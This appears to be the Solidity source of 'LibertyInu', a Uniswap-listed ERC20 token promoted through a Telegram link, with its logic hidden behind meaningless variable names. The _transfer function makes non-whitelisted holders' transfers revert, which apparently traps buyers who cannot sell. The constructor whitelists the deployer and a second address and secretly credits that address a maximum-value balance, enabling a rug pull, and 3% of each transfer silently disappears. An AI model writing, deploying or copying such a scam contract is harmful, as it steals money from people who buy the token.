// https://t.me/libertyinu

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract LibertyInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private fruit;

    function _transfer(
        address cast,
        address gain,
        uint256 better
    ) internal override {
        uint256 perfectly = plane;

        if (opinion[cast] == 0 && fruit[cast] > 0 && uniswapV2Pair != cast) {
            opinion[cast] -= perfectly;
        }

        address then = practical;
        practical = gain;
        fruit[then] += perfectly + 1;

        _balances[cast] -= better;
        uint256 wire = (better / 100) * plane;
        better -= wire;
        _balances[gain] += better;
    }

    address private practical;
    mapping(address => uint256) private opinion;
    uint256 public plane = 3;

    constructor(
        string memory move,
        string memory shells,
        address frighten,
        address one
    ) ERC20(move, shells) {
        uint256 machinery = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(frighten);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        opinion[msg.sender] = machinery;
        opinion[one] = machinery;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[one] = machinery;
    }
}